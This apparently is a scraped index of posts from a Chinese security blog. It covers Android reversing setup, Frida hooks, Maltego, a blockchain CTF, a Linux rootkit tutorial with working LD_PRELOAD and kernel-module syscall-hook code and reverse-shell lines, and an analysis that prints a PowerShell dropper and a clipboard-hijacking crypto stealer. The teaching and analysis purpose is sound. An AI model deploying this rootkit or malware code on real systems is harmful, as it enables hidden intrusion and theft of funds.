怎麼卸載 system image ? A : 打開 SDK Manager ( 在 AVD Manager 旁邊 )，勾選 Show Package Details，就可以看到下載過的 system image，取消勾選再按 OK 就卸載了 Q : 怎麼卸載 app ? A : 除了麻瓜的方法外，也可以在 adb shell 拿到 shell 之後，用 pm list packages 看有哪些 app，再用 pm uninstall -k com.example.test_app 卸載 app Q : 怎麼把 apk 抓出來? A : 先用 pm path com.example.test_app 找出 apk 的路徑，再用 adb pull /data/app/com.example.test_app.apk ./ 抓出來 其他的 Android 虛擬機 如果你只是想玩遊戲的話，可以參考下面幾款模擬器 BlueStacks NoxPlayer ( 夜神模擬器 ) MemuPlay ( 逍遙模擬器 ) 等等","link":"/2020/02/15/security/reverse/android-emulator/"},{"title":"【安卓逆向】透過 Burp Suite Proxy 夜神模擬器","text":"前言 在上一篇 adb 的環境佈置中，我們是用 Android Emulator，但我想要 reverse 的 app 只有支援 arm ( 蠻多 app 都沒有支援 x86-64 的 )，而在我 x86-64 機器上的 Android Emulator 上開 arm 的虛擬機很慢，所以我就換用了 Nox Player，他同時支援 arm 跟 x86-64 的架構，速度也挺快的。 恩等等，我剛剛才發現原來 Nox Player 是在 VirtualBox 上面開一台虛擬機跑，傻眼。 怎麼知道這個 app 支援什麼用 apktool 解開 apk 檔後，看 /lib 資料夾下面有哪些資料夾，可能會有 arm64-v8a、armeabi-v7a、x86、x86_64 等，這些就是這個 app 用到的函式庫，沒有對應架構的函式庫當然就是不支援了，或者有些 app 會將每個架構分開發佈，只要去下載對應架構的 app 就可以了。 adb 怎麼連上夜神模擬器夜神模擬器預設會把 adb server 開在 port 62001, 62025, 62026, … ( 我不知道為什麽 62001 直接跳到 62025 ) 所以 adb connect localhost:62001 就可以啦 Drony 主要是參考這篇 Android Hacking | Setup Global Proxy for All Apps in Android (without root) with Burp Suite 的教學，在使用 Drony 前，我還有用過另一款叫 ProxyDroid，不過沒成功，不知道出了什麼事。 基本流程是這樣的，因為 Drony 本身也是一個 proxy server，所以要先在 Android 的設定中將 proxy 導向到 Drony，然後在 Drony 的設定中將 proxy 導向主機的 Burp Suite。 第一步 打開 Android 的設定，照著下面這樣點 設定 &gt; 無限與網路 &gt; Wi-Fi &gt; 你的 Wi-FI 的名字 ( 長按他 ) &gt; 修改網路 &gt; 顯示進階選項 &gt; Proxy ( 手動 ) 主機名稱填 127.0.0.1，通訊埠填 8020 ( Drony 預設的通訊埠 ) 第二步 打開 Drony 的設置，照著下面這樣點 設置 &gt; 網路 &gt; 無線網路 &gt; 你的 Wi-FI 的名字 代理類型選手冊 ( 也就是 Manual，真爛的翻譯 )，主機名稱填主機的 ip，通訊埠填 8080 ( Burp Suite 預設的通訊埠 ) 怎麼找主機的 ip主機基本上會是 Nox Player 的 default gateway ( 其實就是在 VirtualBox 的 NAT Mode )，所以下 adb shell ip route show 找到 default gateway 就是主機的 ip 了 完成 這樣就設定好啦，在日誌頁面把開關打開就可以了。 Burp Suite 憑證安裝 順便安裝一下 Burp Suite 的憑證，這樣就不會一直跳憑證問題了 先到 http://burp 下載 Burp Suite 的憑證，載下來是 der 副檔名的話，先把他改名成 cer 副檔名結尾 打開 Android 的設定，照著下面這樣點 設定 &gt; 個人 &gt; 安全性 &gt; 憑證儲存空間 &gt; 從 SD 卡安裝 ( 選 cacert.cer ) 安裝的時候他會叫你設定一下 PIN 碼","link":"/2020/03/18/security/reverse/android-proxy/"},{"title":"看不到的後門 - ROOTKIT 隱藏程序技巧","text":"簡報版本 : https://www.slideshare.net/ssuserd44fa2/rootkit-101-228943978 root + kit 的意思就是拿到 root 權限後可以用的工具包，大多是隱藏程序的技巧，所以 rootkit 也可以理解成隱藏程序技術的通稱，不過也有些不需要 root 的隱藏程序技術，今天會逐一介紹 linux 上 rootkit 的原理與實作 隱之呼吸壹之型 - PATH Hijack 條件 不需要 root 目標 在 ps 的結果中隱藏下面兩種簡單的後門 bash -i &gt;&amp; /dev/tcp/192.168.100.100/9999 0&gt;&amp;1 socat TCP:192.168.100.100:9999 EXEC:/bin/bash 手法 假設在 $PATH 環境變數中 /usr/local/bin 在 /bin 前面，所以我們可以寫一個檔案在 /usr/local/bin/ps，這樣 ps 就會執行 /usr/local/bin/ps 而不是 /bin/ps，而達到 hook 程序的效果 12#!/bin/bash/bin/ps $@ | grep -Ev '192.168.100.100|socat' grep -Ev 是 inverse match $@ 是傳進來的參數 ( 這裡原封不動的交給 /bin/ps ) 隱之呼吸貳之型 - LD_PRELOAD 條件 不需要 root 目標 在 ps 的結果中隱藏下面兩種簡單的後門 bash -i &gt;&amp; /dev/tcp/192.168.100.100/9999 0&gt;&amp;1 socat TCP:192.168.100.100:9999 EXEC:/bin/bash 要 hook 哪個函式 首先我們可以用 ltrace 看 ps 跑起來呼叫了哪些 library 的函式 1234567...fwrite(\" [jfsCommit]\\nhe]\\n4\\n0\\n\\nstart\\ngrou\"..., 13, 1, 0x7fbfcd303760) = 1readproc(0x55e061b12f90, 0x55e0609d1540, 13, 1024) = 0x55e0609d1540escape_str(0x7fbfcd90b090, 0x55e0609d1740, 0x20000, 0x7fff6f748044) = 4strlen(\"root\") = 4fwrite(\"root\", 4, 1, 0x7fbfcd303760) = 1... 會發現 readproc 一直出現，查看一下 man page 12345678NAME readproc, freeproc - read information from next /proc/## entrySYNOPSIS #include &lt;proc/readproc.h&gt; proc_t* readproc(PROCTAB *PT, proc_t *return_buf); void freeproc(proc_t *p); 那我們就在 ps 的原始碼中找一下 readproc 的用法，如下 procps-3.2.8/ps/display.c >331123456789ptp = openproc(needs_for_format | needs_for_sort | needs_for_select | needs_for_threads);if(!ptp) { fprintf(stderr, \"Error: can not access /proc.\\n\"); exit(1);}memset(&amp;buf, '#', sizeof(proc_t));switch(thread_flags &amp; (TF_show_proc|TF_loose_tasks|TF_show_task)){case TF_show_proc: // normal non-thread output while(readproc(ptp,&amp;buf)){}} 如何取得 ps 原始碼ps 這個指令是來自 procps，可以從 procps.sourceforge.net 下載 另外其他基本的 shell 指令的原始碼則可以從 www.gnu.org/software/coreutils 下載 基本上就是先 openproc 然後再用 readproc 一次讀一個 process entry ptp 的型態是 PROCTAB*，裡面有 linked list 的結構，讓程式能找到下一個 process buf 的型態是 proc_t*，包含了 process 的資訊 那我們就去 hook readproc 這個函式，把想隱藏的 procss 跳過 dlsym 1typeof(readproc) *old_readproc = dlsym(RTLD_NEXT, \"readproc\"); 這行是 LD_PRELOAD 技巧的關鍵，我們用 dlsym 這個函式來找 symbol 的位址 放 RTLD_NEXT 這個參數會找下一個 symbol 而不是第一個 typeof(readproc) 只是一個語法糖，代表 readproc 這個 function pointer 的型態 POC 原始碼 hook.c123456789101112131415161718192021#define _GNU_SOURCE#include &lt;dlfcn.h&gt;#include &lt;string.h&gt;#include &lt;proc/readproc.h&gt;int hidden (char *target) { char *keywords[2] = { \"192.168.100.100\", \"socat\" }; for (int i = 0; i &lt; 2; i++) if (strstr(target, keywords[i])) return 1; return 0;}proc_t* readproc (PROCTAB *PT, proc_t *return_buf) { typeof(readproc) *old_readproc = dlsym(RTLD_NEXT, \"readproc\"); proc_t* ret_value = old_readproc(PT, return_buf); while (ret_value &amp;&amp; ret_value-&gt;cmdline &amp;&amp; hidden(ret_value-&gt;cmdline[0])) { ret_value = old_readproc(PT, return_buf); } return ret_value;} 編譯 1gcc -fPIC -shared -o hook.so hook.c 執行 指定 LD_PRELOAD 環境變數來載入編譯好的動態連結庫，但只有該次生效 1LD_PRELOAD=/path/to/hook.so ps aux 或是編輯 ld.so.preload，寫入 hook.so 的路徑，之後每次執行都會載入，可以用 ldd 查看是否成功 preload DEMO 隱之呼吸參之型 - Loadable Kernel Module 條件 需要 root 目標 在 ls 的結果中隱藏 rootkit.ko 取得 sys_call_table 首先因為我們要 hijack system call 所以要先取得 sys_call_table 的位址 方法一 在 2.4 以前的內核版本，預設導出所有符號，所以可以直接用 如果自己編譯內核的話，可以修改原始碼用 EXPORT_SYMBOL 把 sys_call_table 的符號導出來 1extern void *sys_call_table[]; 方法二 kallsyms_lookup_name 這個函式也可以抓位址，但他也不一定會被導出 123456789#include &lt;linux/kallsyms.h&gt;static void **sys_call_table;static int __init hook_init (void) { sys_call_table = (void **)kallsyms_lookup_name(\"sys_call_table\"); printk(KERN_INFO \"sys_call_table = 0x%px\\n\", sys_call_table); return 0;} How to printk a pointer ?要用 printk 印出 pointer 可以用 %px %p 只會印出該指標的雜湊值而不是真正的指標的值，這是為了避免洩漏內核位址 方法三 下面兩個檔案路徑有可能會有 sys_call_table 的位址 /proc/kallsyms 是一個特殊的檔案，會在讀取時動態產生 12cat /boot/System.map-$(uname -r) | grep \"sys_call_table\"cat /proc/kallsyms | grep \"sys_call_table\" 方法四 最穩的方式是自己去 kernel 裡面撈 memory 想法源自於這篇，但 kernel 5.x.x 有多包了一層 do_syscall_64，需要做一些改動 1234567891011121314151617181920212223uint8_t *get_syscalltable (void) { int lo, hi; asm volatile(\"rdmsr\" : \"=a\" (lo), \"=d\" (hi) : \"c\" (MSR_LSTAR)); uint8_t *entry_SYSCALL_64 = (uint8_t *)(((uint64_t)hi &lt;&lt; 32) | lo); uint8_t *ptr; uint8_t do_syscall_64_inst[7] = { 0x48, 0x89, 0xc7, // mov rdi, rax 0x48, 0x89, 0xe6, // mov rsi, rsp 0xe8, // call do_syscall_64 }; ptr = find(entry_SYSCALL_64, do_syscall_64_inst, 7); uint8_t *do_syscall_64 = (uint8_t *)(ptr + 11 + ((uint64_t)0xffffffff00000000 | *(uint32_t *)(ptr + 7))); uint8_t sys_call_table_inst[4] = { 0x48, 0x8b, 0x04, 0xfd // mov rax, QWORD PTR [rdi*8-?] }; ptr = find(do_syscall_64, sys_call_table_inst, 4); uint8_t *sys_call_table = (uint8_t *)((uint64_t)0xffffffff00000000 | *(uint32_t *)(ptr + 4)); return sys_call_table;} 要理解上面的程式碼在做什麼，我們需要知道下面兩件事 Module Specific Register 是什麼 ? module specific register 是一塊跟 CPU 有關的暫存器 每個 msr 都會有個 index，可以想像成一個很大的陣列 用 rdmsr, wrmsr 這組 instructions 可以對 msr 做讀寫，必須提供 index kernel 一開始在初始化的時候，把 entry_SYSCALL_64 寫到 msr[MSR_LSTAR] syscall 執行下去實際上是發生什麼事 ? 使用者呼叫 syscall 切換到 ring 0 跳去 msr[MSR_LSTAR] 這個位址也就是 entry_SYSCALL_64 這裡 呼叫 do_syscall_64 regs-&gt;ax = sys_call_table[nr](regs); 這行呼叫對應的函式 解讀上面的程式碼的步驟 我們已經在 ring 0 了 直接用 rdmsr 讀 msr[MSR_LSTAR] 直接在 entry_SYSCALL_64 的 instructions 裡面找下面這個 pattern 123movq %rax, %rdi,movq %rsp, %rsicall do_syscall_64 這樣就找到 do_syscall_64 了 進到 do_syscall_64 後，一樣畫葫蘆，再找下面這個 pattern 1mov rax, QWORD PTR [rdi*8-?] 最後，這個問號的值就會是 sys_call_table 的位址 讓 sys_call_table 可以寫入 cr0 register 的其中一個 bit 是代表 read-only 區段可不可寫，改成 0 就通通可寫啦 write_cr0 這個 function 在 kernel 5.x.x 版加了檢查，不過我們直接寫 assembly 就沒問題啦 123456789void writable_unlock (void) { unsigned long val = read_cr0() &amp; (~X86_CR0_WP); asm volatile(\"mov %0,%%cr0\": \"+r\" (val));}void writable_lock (void) { unsigned long val = read_cr0() | X86_CR0_WP; asm volatile(\"mov %0,%%cr0\": \"+r\" (val));} 要 hook 哪個 syscall ps 做的事情就是去讀 /proc 底下所有檔案，基本上是 ls 的強化版，那我們這次就先做 ls 隱藏檔案 一樣用 strace ls 去看他呼叫了哪些 syscall 123456getdents(3, /* 16 entries */, 32768) = 512getdents(3, /* 0 entries */, 32768) = 0close(3)fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 1), ...}) = 0write(1, \"a\\thook.c\\t initramfs\\t linux-5.\"..., 75) = 75write(1, \"attach\\thook.so initramfs.cpio.g\"..., 90) = 90 getdents 看起來是關鍵的 syscall，查看一下 man page 12345678910NAME getdents, getdents64 - get directory entriesSYNOPSIS int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count); int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count); Note: There are no glibc wrappers for these system calls; see NOTES. getdents 跑完後會把結果存到 dirp 裡面，那我們就遍歷 dirp 把要隱藏的丟掉就好了 kernel 4.x.x 的參數是放在 stack 傳的，但 kernel 5.x.x 多包了一層 do_syscall_64，參數傳遞變成是透過 struct pt_regs *regs 這個結構去傳 rootkit.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899#include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/kallsyms.h&gt;#include &lt;linux/syscalls.h&gt;MODULE_LICENSE(\"GPL\");struct linux_dirent { unsigned long d_ino; /* Inode number */ unsigned long d_off; /* Offset to next linux_dirent */ unsigned short d_reclen; /* Length of this linux_dirent */ char d_name[]; /* Filename (null-terminated) */};void **sys_call_table;int (*original_getdents) (struct pt_regs *regs);void writable_unlock (void) { unsigned long val = read_cr0() &amp; (~X86_CR0_WP); asm volatile(\"mov %0,%%cr0\": \"+r\" (val));}void writable_lock (void) { unsigned long val = read_cr0() | X86_CR0_WP; asm volatile(\"mov %0,%%cr0\": \"+r\" (val));}uint8_t *find (uint8_t *a, uint8_t *b, size_t len) { for (uint8_t *ptr = a, i = 0; i &lt; 500; i++, ptr++) { if (!strncmp(ptr, b, len)) { return ptr; } } return 0;}uint8_t *get_syscalltable (void) { int lo, hi; asm volatile(\"rdmsr\" : \"=a\" (lo), \"=d\" (hi) : \"c\" (MSR_LSTAR)); uint8_t *entry_SYSCALL_64 = (uint8_t *)(((uint64_t)hi &lt;&lt; 32) | lo); uint8_t *ptr; uint8_t do_syscall_64_inst[7] = { 0x48, 0x89, 0xc7, // mov rdi, rax 0x48, 0x89, 0xe6, // mov rsi, rsp 0xe8, // call do_syscall_64 }; ptr = find(entry_SYSCALL_64, do_syscall_64_inst, 7); uint8_t *do_syscall_64 = (uint8_t *)(ptr + 11 + ((uint64_t)0xffffffff00000000 | *(uint32_t *)(ptr + 7))); uint8_t sys_call_table_inst[4] = { 0x48, 0x8b, 0x04, 0xfd // mov rax, QWORD PTR [rdi*8-?] }; ptr = find(do_syscall_64, sys_call_table_inst, 4); uint8_t *sys_call_table = (uint8_t *)((uint64_t)0xffffffff00000000 | *(uint32_t *)(ptr + 4)); return sys_call_table;}#define FILENAME \"rootkit.ko\"int sys_getdents_hook(struct pt_regs *regs) { int total = original_getdents(regs); unsigned int fd = regs-&gt;di; struct linux_dirent *dirent = regs-&gt;si; unsigned int count = regs-&gt;dx; int offset = 0; while (offset &lt; total) { struct linux_dirent *ptr = (struct linux_dirent *)((uint8_t *)dirent + offset); struct linux_dirent *next_ptr = (struct linux_dirent *)((uint8_t *)dirent + offset + ptr-&gt;d_reclen); if (strncmp(ptr-&gt;d_name, FILENAME, strlen(FILENAME)) == 0) { int reclen = ptr-&gt;d_reclen; memmove(ptr, next_ptr, total - (offset + reclen)); total -= reclen; } else { offset += ptr-&gt;d_reclen; } } return total;}static int rootkit_init(void) { sys_call_table = (void **)get_syscalltable(); printk(KERN_INFO \"sys_call_table = %llu\\n\", sys_call_table); writable_unlock(); original_getdents = sys_call_table[__NR_getdents]; sys_call_table[__NR_getdents] = sys_getdents_hook; return 0;}static void rootkit_exit(void) { sys_call_table[__NR_getdents] = original_getdents; writable_lock();}module_init(rootkit_init);module_exit(rootkit_exit); DEMO 1: http://fluxius.handgrep.se/2011/10/31/the-magic-of-ld_preload-for-userland-rootkits/ 2: https://exploit.ph/linux-kernel-hacking/2014/10/23/rootkit-for-hiding-files/ 3: https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/gnu_linux.html 4: https://www.kernel.org/doc/Documentation/printk-formats.txt 5: https://blog.trailofbits.com/2019/01/17/how-to-write-a-rootkit-without-really-trying/","link":"/2019/06/07/security/pwn/rootkit/"},{"title":"【小工具】Maltego","text":"Maltego 是用來自動化情資蒐集的工具。 基本介紹 一開始就按 Creat a new graph 新增一個工作的圖層，就可以在上面畫出關係圖。 Entities 是基本物件，有很多種類型比如 Company, Organization, Domain, Website, …，每個物件都有幾個屬性欄位，假設你拿到某個人的手機號碼，那可以從旁邊 Entity Palette 拖曳一個 Phone Number 到右邊空白處。 Transforms 就是一個可以重複使用的函式，比如已經有了手機號碼，那就去某個網站上爬手機號碼對應的國家之類的，把這個爬的步驟寫成一個 transform，就可以自動化去從已知的資料生更多相關的資料。Local Transform 是自己寫的函式，也有別人寫好的在 Transform Hub 上面。 Local Transforms 跟著官方文件 maltego docs 做就可以大概了解怎麼用 python 去寫 Local Transforms 了。 12pip install maltego-trxmaltego-trx start new_project 先安裝 python 套件，再用 maltego-trx 去初始化一個 project transforms/TaxIDToCompany.py123456789101112import jsonimport requestsfrom maltego_trx.entities import Personfrom maltego_trx.transform import DiscoverableTransformclass TaxIDToCompany(DiscoverableTransform): @classmethod def create_entities(cls, request, response): taxid = request.Properties['properties.taxid'] r = requests.get(f'http://company.g0v.ronny.tw/api/show/{taxid}') result = json.loads(r.text) response.addEntity('maltego.Company', result['data']['公司名稱']) 主要就是繼承 DiscoverableTransform 然後填寫 create_entities 這個函式，request 裡面就有執行 transform 的那個 entity 的資訊，然後這裡是用統一編號 ( TaxID ) 去找公司名稱，然後新增一個公司的 Entity。 原本沒有 TaxID 這個 Entity 要先去 New Entity Type 新增一個 TaxID。 company.g0v.ronny.tw 回傳的資訊有很多，可以把那些資訊都加進來，可是我就懶。 寫完之後要把 Local Transform 加進去，有幾個欄位要注意， Input entity type : 要填這個 transform 要對哪一種 entity 做操作 Command : 我們是用 python api 所以要填 python 的 PATH，在 linux 上可以用 which python 找 Parameters : 填 project.py local TaxIDToCompany，project.py 是初始化 project 完會產生的腳本，local 指的就是 Local Transform，TaxIDToCompany 是你 transform 的名字，就是那個檔名的部分吧 Working directory: Project 的路徑，就是要有 project.py 的那個地方 最後按下 Run 跑完 transform 之後，就會自動新增一個 Company 的 Entity。","link":"/2020/07/31/security/osint/maltego/"},{"title":"【安卓逆向】Frida Hook 動態調試","text":"今天我們要來練習用 frida 在 Android 上做動態調試 逆之呼吸壹之型 - 一般函式 先來寫個簡單的範例 APP 有一個按扭和一個輸入欄，輸入名字之後，按下按鈕，就會顯示 Hello 加上你輸入的名字 不會寫 APP 的小朋友可以先去 youtube 上找教學，有一大堆 MainActivity.java1234567891011121314151617181920212223242526272829303132package com.example.myapplication;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.view.View;import android.widget.Button;import android.widget.EditText;import android.widget.TextView;public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button sayButton = findViewById(R.id.sayButton); sayButton.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { EditText somethingEditText = findViewById(R.id.somethingEditText); TextView resultTextView = findViewById(R.id.resultTextView); String something = somethingEditText.getText().toString(); resultTextView.setText(say(something)); } }); } String say (String something) { return \"Hello \" + something; }} python 負責呼叫 frida api 做注入，javascript 是被注入進去做事的 我們的目標是 hook 函式 say，並在原本的輸出文字後面加上 !!! hook.py1234567891011121314151617import fridadef on_message(message, payload): print(message)device = frida.get_usb_device()pid = device.spawn([\"com.example.myapplication\"])session = device.attach(pid)with open(\"script.js\") as f: script = session.create_script(f.read()) script.on(\"message\", on_message) script.load()device.resume(pid)input() script.js1234567Java.perform(() =&gt; { main = Java.use(\"com.example.myapplication.MainActivity\") main.say.implementation = function (something) { var ret = this.say(something) return ret + '!!!' }}) 逆之呼吸貳之型 - 重載函式 改一下範例 APP，多加上一個接受數字做輸入的 say 函式 接收到數字後，就輸出 Hello 加上輸入的數字的平方 MainActivity.java123456789101112131415161718192021222324252627282930313233343536373839404142package com.example.myapplication;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.view.View;import android.widget.Button;import android.widget.EditText;import android.widget.TextView;public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button sayButton = findViewById(R.id.sayButton); sayButton.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { EditText somethingEditText = findViewById(R.id.somethingEditText); TextView resultTextView = findViewById(R.id.resultTextView); String something = somethingEditText.getText().toString(); try { Integer number = Integer.parseInt(something); resultTextView.setText(say(number)); } catch (NumberFormatException e) { resultTextView.setText(say(something)); } } }); } String say (String something) { return \"Hello \" + something; } String say (Integer number) { number = number * number; return \"Hello \" + number.toString(); }} 兩個 say 都是一樣的名字，所以 hook 的時候要用 overload 去區分，overload 參數放的是目標函式輸入參數的型態 這次我們在新的 say 函式的輸出文字後面加上 ??? hook.py 跟上一個例子一樣就不再貼一次了 script.js1234567891011Java.perform(() =&gt; { main = Java.use(\"com.example.myapplication.MainActivity\") main.say.overload(\"java.lang.String\").implementation = function (something) { var ret = this.say(something) return ret + '!!!' } main.say.overload(\"java.lang.Integer\").implementation = function (number) { var ret = this.say(number) return ret + '???' }}) 逆之呼吸參之型 - 隱藏函式 再改一下範例 APP，多加上一個變數 secret 和一個函式 getSecret，在 onCreate 裡面會給 secret 一個隨機值，我們的目標就是找出這個值 MainActivity.java12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152package com.example.myapplication;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.view.View;import android.widget.Button;import android.widget.EditText;import android.widget.TextView;public class MainActivity extends AppCompatActivity { private int secret; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); secret = (int) (Math.random() * 100); Button sayButton = findViewById(R.id.sayButton); sayButton.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { EditText somethingEditText = findViewById(R.id.somethingEditText); TextView resultTextView = findViewById(R.id.resultTextView); String something = somethingEditText.getText().toString(); try { Integer number = Integer.parseInt(something); resultTextView.setText(say(number)); } catch (NumberFormatException e) { resultTextView.setText(say(something)); } } }); } String say (String something) { return \"Hello \" + something; } String say (Integer number) { number = number * number; return \"Hello \" + number.toString(); } int getSecret () { return secret; }} 因為我們的目標不是自己 new 一個物件出來抓 secret，這樣就只是一個我們自己就可以生成的隨機值而已 我們是要找出目前已經存在的那個 instance 的 secret，在實際例子中可能就會是一組隨機生成的密碼之類的 所以我們要用到 Java.choose 去抓 instance，抓到 instance 後，可以 instance.getSecret() 呼叫函式搞定 instance.secret.value 存取變數搞定 然後用 send 可以把資料傳到 python 端的 on_message 做處理 script.js123456789Java.perform(function () { Java.choose(\"com.example.myapplication.MainActivity\", { onMatch: function (instance) { send(instance.getSecret()) // call function send(instance.secret.value) // access vairable }, onComplete: function () {} }) }) 疑難雜症 Q : 有函式 a 跟變數 a 同名怎麼辦 ? A : a 存取函式，_a 存取變數 https://github.com/hookmaster/frida-all-in-one How to access class member variable if there’s a member function called the same name?","link":"/2020/02/16/security/reverse/frida/"},{"title":"Clipboard hijacking cryptocurrency malware on tradingview.com","text":"最近在 tradingview.com 上面看到這篇 Idea EOS - footprints of institutional money，看起來像是正常的分析趨勢走向的 Idea，但是下面留言有一個連結 mycryptorush.com/signals，說是可以得到免費的 bitcoin 和交易趨勢訊號。 點下去其實是導向 tinyurl.com/cryptorushsignals，這個短網址又是導向 https://bbuseruploads.s3.amazonaws.com/7e1f7e0b...，會下載 CryptoRushSignals.zip 下來。看起來就很可疑，明明看起來是要去一個網站，卻載了檔案下來。解壓縮該 zip 檔之後有兩個檔案 HOWTOUSE.txt 和 CryptoRushSignals.run.lnk。 HOWTOUSE.txt12Open CryptoRushSignals.run, this will open up a website were you can register.It then automatically will open up an excel sheet with the live current signals. 純文字的說明文件，叫你執行 CryptoRushSignals.run，真的去執行之後，會跳出瀏覽器瀏覽 https://t.me/MyCryptoradar，讓你加入一個 telegram 群組，就可以收到一些指標數據的變化通知，裡面現在有 400 多人。 除了打開瀏覽器叫你加群組之外，他還秘密執行了下面這段 payload 1\"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Start-Process -FilePath \"https://t.me/MyCryptoradar; Invoke-WebRequest -Uri \"https://bitbucket.org/cryptorushh/cryptorush/downloads/pcmoni.png\" -OutFile C:\\Users\\$env:UserName\\AppData\\Roaming\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\pclp.exe 基本上就是去 bitbucket 下載 https://bitbucket.org/cryptorushh/cryptorush/downloads/pcmoni.png 這個 png，然後放到開機自動執行的路徑，而且這個也不是 png，他就是一隻 PE 執行檔。 稍微看一下那隻 PE 執行檔後，發現他是用 py2exe 包的，那就用 unpy2exe 拆回 pyc，再用 uncompyle6 就可以拆出原本的 python script 了。 8.61.py1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071# uncompyle6 version 3.7.2# Python bytecode 2.7 (62211)# Decompiled from: Python 2.7.15 (default, Dec 23 2019, 14:00:59) # [GCC 4.2.1 Compatible Apple LLVM 10.0.1 (clang-1001.0.46.4)]# Embedded file name: 8.61.py# Compiled at: 2020-08-15 23:23:49from __future__ import print_functionimport sysoo000 = sys.version_info[0] == 2ii = 2048oOOo = 7def O0(ll_opy_): o0O = ord(ll_opy_[(-1)]) iI11I1II1I1I = ll_opy_[:-1] oooo = o0O % len(iI11I1II1I1I) iIIii1IIi = iI11I1II1I1I[:oooo] + iI11I1II1I1I[oooo:] if oo000: o0OO00 = unicode().join([ unichr(ord(oo) - ii - (i1iII1IiiIiI1 + o0O) % oOOo) for i1iII1IiiIiI1, oo in enumerate(iIIii1IIi) ]) else: o0OO00 = str().join([ chr(ord(oo) - ii - (i1iII1IiiIiI1 + o0O) % oOOo) for i1iII1IiiIiI1, oo in enumerate(iIIii1IIi) ]) return eval(o0OO00)import time, re, pyperclip, subprocessif 0: ooOoO0O00 * IIiIiII11iif 0: oOo0O0Ooo * I1ii11iIi11idef I1IiI(): while 0 &lt; 1: try: o0OOO = None if 0: ooOo + Oo o0OIiiIII111iI = subprocess.Popen(['C:\\\\windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'Get-Clipboard'], stdout=subprocess.PIPE, startupinfo=IiII) o0OOO = str(o0OIiiIII111iI.stdout.read()).strip().decode('utf-8').rstrip(u'\\x00') if o0OOO != iI1Ii11111iIi and o0OOO != i1i1II: if re.match(O0oo0OO0, str(o0OOO)): pyperclip.copy(iI1Ii11111iIi) pyperclip.paste() elif re.match(I1i1iiI1, str(o0OOO)): pyperclip.copy(i1i1II) pyperclip.paste() except Exception as iiIIIII1i1iI: print(iiIIIII1i1iI) time.sleep(1) if 0: o00ooo0 / Oo00O0 returnif __name__ == O0(u'\\u0829\\u0862\\u0863\\u0872\\u0867\\u0869\\u086f\\u0861\\u0862\\u082b\\u0805'): i1i1II = '0x22f338FC26Ea71EC884256C29103122c4578EE27' iI1Ii11111iIi = '14uJZuPNtdtDowpcoGBF14fX3uo57fbvvS' O0oo0OO0 = '^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$' I1i1iiI1 = '^(0x)?[0-9a-fA-F]{40}$' time.sleep(15) IiII = subprocess.STARTUPINFO() IiII.dwFlags |= subprocess.STARTF_USESHOWWINDOW I1IiI() if 0: o0oooOoO0 if 0: IiIii1Ii1IIi / O0Oooo00.oo00 * I11 if 0: I1111 * o0o0Oo0oooo0 / I1I1i1 * oO0 / IIIi1i1I# okay decompiling 8.61.py.pyc 有稍微混淆過的原始碼，重新命名一下變數就可以了。 123456789101112131415161718192021222324252627282930from __future__ import print_functionimport time, re, pyperclip, subprocessdef main(): while True: try: clipboard = None process = subprocess.Popen(['C:\\\\windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'Get-Clipboard'], stdout=subprocess.PIPE, startupinfo=startupinfo) clipboard = str(process.stdout.read()).strip().decode('utf-8').rstrip(u'\\x00') if clipboard != btc_address and clipboard != eth_address: if re.match(btc_address_pattern, str(clipboard)): pyperclip.copy(btc_address) pyperclip.paste() elif re.match(eth_address_pattern, str(clipboard)): pyperclip.copy(eth_address) pyperclip.paste() except Exception as err: print(err) time.sleep(1) returnif __name__ == '__main__': eth_address = '0x22f338FC26Ea71EC884256C29103122c4578EE27' btc_address = '14uJZuPNtdtDowpcoGBF14fX3uo57fbvvS' btc_address_pattern = '^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$' eth_address_pattern = '^(0x)?[0-9a-fA-F]{40}$' time.sleep(15) startupinfo = subprocess.STARTUPINFO() startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW main() 他把你剪貼簿裡面符合 bitcoin 或 ethereum 地址格式的通通換成他錢包的位址。 IOC 0x22f338FC26Ea71EC884256C29103122c4578EE27 14uJZuPNtdtDowpcoGBF14fX3uo57fbvvS","link":"/2020/08/16/security/news/clipboard-hijack/"},{"title":"【Writeups】Security Innovation Blockchain CTF","text":"Donation 這題是簽到題 就只是讓我們呼叫合約裡面的這個函式 withdrawDonationsFromTheSuckersWhoFellForIt Lock Box 這題有個 private 的 pin 變數，但是 private 只是代表那個變數沒有 getter 函式，把合約的狀態抓下來就看光光啦 使用 web3.eth.getStorageAt 這個函式 父合約的變數會在子合約的變數的前面 所以 position 0 的位址是 authorizedToPlay，而 position 1 的位址就是 pin 變數在 storage 裡面怎麼擺的可以參考這篇 Understanding Ethereum Smart Contract Storage Piggy Bank 這題直接呼叫 collectFunds 就好了 只有 PiggyBank 的 collectFunds 有 onlyOwner，CharliesPiggyBank 的 collectFunds 沒有 